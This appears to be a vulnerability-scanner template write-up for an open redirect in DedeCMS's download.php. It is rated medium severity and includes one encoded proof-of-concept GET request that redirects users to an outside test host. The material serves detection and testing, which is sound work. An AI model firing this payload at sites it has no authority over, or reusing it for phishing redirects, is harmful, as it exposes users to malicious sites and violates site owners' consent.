# Nuclei Template: DedeCMS - Open Redirect
**Template ID:** dedecms-openredirect
**Vulnerability Class:** Open Redirect
**Severity:** Medium
**CWE:** CWE-601
**Source:** Nuclei Template (`dedecms-openredirect.yaml`)

## Vulnerability Information & PoC

## Description
DedeCMS contains an open redirect vulnerability. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/plus/download.php?open=1&link=aHR0cHM6Ly9pbnRlcmFjdC5zaA==
```

## References
- https://blog.csdn.net/ystyaoshengting/article/details/82734888
